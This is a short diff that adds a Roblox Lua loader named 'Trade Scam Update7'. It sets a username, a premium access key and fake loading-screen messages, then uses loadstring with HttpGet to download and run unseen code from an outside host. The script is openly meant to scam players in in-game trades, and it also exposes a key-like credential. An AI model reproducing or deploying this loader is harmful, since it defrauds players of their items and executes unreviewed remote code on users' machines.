@@ -1,0 +1,8 @@
+UserName = "tuyiopghe"
+_G.PremiumKey = "rizzhub-RWCmRPcwV5b4buRJDGJf"
+_G.ScriptName = "Trade Scam Update7"
+_G.FirstText = "Loading"
+_G.SecondText = "half way done"
+_G.ThirdText = "almost there"
+_G.WaitingTime = 48
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
